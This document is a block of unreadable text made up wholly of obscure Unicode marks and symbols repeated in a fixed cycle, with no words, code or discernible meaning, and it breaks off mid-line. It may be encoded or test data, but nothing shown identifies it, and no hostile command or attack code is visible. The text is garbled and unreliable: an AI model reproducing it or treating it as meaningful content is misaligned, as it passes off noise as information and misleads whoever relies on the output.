︫࡛࡛࡙࡙࡙࡙࡙࡙࡙؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬